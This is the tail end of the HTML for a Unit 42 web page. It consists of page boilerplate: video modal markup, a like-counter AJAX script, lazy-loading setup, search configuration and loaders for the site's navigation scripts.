            <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/close-modal.svg" alt="Close button">
          </button>
          <video class="modal__video" id="customVideo">
            <source src="" type="video/mp4">Your browser does not support the video tag.
          </video>
          <div class="modal__post-details" tabindex="-1">       
              <h3>Default Heading</h3>
              <a class="l-btn" href="#" title="Right Arrow Icon" role="link" data-page-track="true" data-page-track-value="overview:explore reports:View all reports">Read the article
              <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/right-arrow.svg" alt="Right Arrow">
              </a>
          </div>
          <div class="modal__video-controls">
            <div class="modal__video-seekbar input__wrapper"><span></span>
              <label class="is-hidden" for="modalSeekBar">Seekbar</label>
              <input class="custom-range" id="modalSeekBar" type="range" min="0" max="100" value="1">
              <p class="modal__remaining-time"></p>
            </div>
            <button class="modal__play-btn is-paused" id="playPauseBtn">
            <img class="play" src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-play-icon.svg" alt="Play">
            <img class="pause" src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-pause-icon1.svg" alt="Pause">
          </button>
            <div class="modal__volume-controls">
              <div class="modal__volume__wrapper">
                <button tabindex="0">
                  <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-volume.svg" alt="Volume">
                </button>
                <div class="modal__volume-seekbar"><span></span>
                  <label class="is-hidden" for="volumeBar">Volume</label>
                  <input class="volume__bar" id="volumeBar" type="range" min="0" max="1" step="0.1" value="0.7">
                </div>
              </div>
              <button class="modal__minimize-btn" id="minimizeBtn">
                <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-minimize.svg" alt="Minimize">
              </button>
            </div>
          </div>
        </div>
      </div><!--  End: video modal -->

    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		var like_nonce = jQuery('#_wpnonce').val();
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type+"&ul_nonce="+like_nonce,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
    <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css' href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=6.6.1' media='all' />
<script src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/js/script.js?ver=1.0.0" id="unit42-v6-navigation-js"></script>

<!--  Start: Scripts Migrated From Unit42-v5 -->
<script type="text/javascript">
const observer_lozad = lozad('.lozad, .lozad-background'); // lazy loads elements with default selector as '.lozad'
observer_lozad.observe();

window.PAN_Clean_Util = {
        isIE: false
};

(function () {
   // INP Util Fix
    function yieldToMain(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
   window.PAN_Clean_Util.yieldToMain = yieldToMain
})();

if(referer == "Prisma" || referer == "Cortex" || referer == "Sase" || referer == "Unit" || referer == "Ngfw"){
  var Coveo_organizationId = "paloaltonetworksintranet";        
  var techDocsPagePath = "https://docs.paloaltonetworks.com/search.html#hd=All%20Prisma%20Cloud%20Documentation&hq=%40panproductcategory%3D%3D(%22Prisma%20Cloud%22)&sort=relevancy&layout=card&numberOfResults=25";
  var languageFromPath="en_US";
  window.Granite = window.Granite || {};
  Granite.I18n = (function() {
  var self = {};
  self.setLocale = function(locale) { };
  self.get = function(text, snippets, note) {
    var out = "";
    if(text){
      if(text ==="coveo.clear"){
        out = "Clear";
      }else if(text ==="coveo.noresultsfound"){
        out = "No results found for this search term.";
      }
    }
    return out;
  };
  return self
  }());
}

  var main_site_critical_top = maindomain_lang+'/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTop.min.js';
  var main_site_defered = maindomain_lang+'/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/defered.min.js';
  var main_site_criticalTopBase = maindomain_lang+'/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTopBase.min.js';
  var main_site_criticalTopProductNav = maindomain_lang+'/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTopProductNav.min.js';
window.PAN_MainNavAsyncUrl = maindomain_lang+"/_jcr_content/globals/cleanHeaderPrisma.prismaRenderer.html";

function loadScript(url, defer){
    var script1 = document.createElement('script');
    script1.setAttribute('type', 'text/javascript');
    script1.setAttribute('src',url);
    if(defer == true){
        script1.setAttribute('defer','defer');
    }
    document.head.appendChild(script1);
}
function loadScript1(url, callback){

    var script = document.createElement("script")
    script.type = "text/javascript";
    if (script.readyState){  //IE
        script.onreadystatechange = function(){
            if (script.readyState == "loaded" || script.readyState == "complete"){
                script.onreadystatechange = null;
                callback();
            }
        };
    } else {  //Others
        script.onload = function(){
            callback();
        };
    }
    script.src = url;
    document.getElementsByTagName("head")[0].appendChild(script);
}
if(referer == "Prisma" || referer == "Cortex" || referer == "Sase" || referer == "Unit" || referer == "Ngfw"){
	if(referer == "Unit"){
    setTimeout(function(){
      loadScript(main_site_criticalTopBase, false);
      loadScript1(main_site_criticalTopProductNav, function(){
        window.PAN_initializeProduct2021Nav();
      });
      loadScript(main_site_defered, false);
    }, 3000);
	}
	else{
    setTimeout(function(){
      loadScript1(main_site_critical_top, function(){
        window.PAN_initializeProduct2021Nav();
      });
      loadScript(main_site_defered, false);
    }, 3000);
	}
}

$(document).ready(function () {
    setTimeout(function(){
      $('.article-banner .ab__options ul li a').each(function(){
          	$(this).attr('target', "_blank");
      });
    }, 4000);
});
</script>
<!--  End: Scripts Migrated From Unit42-v5 -->

</body>
</html>
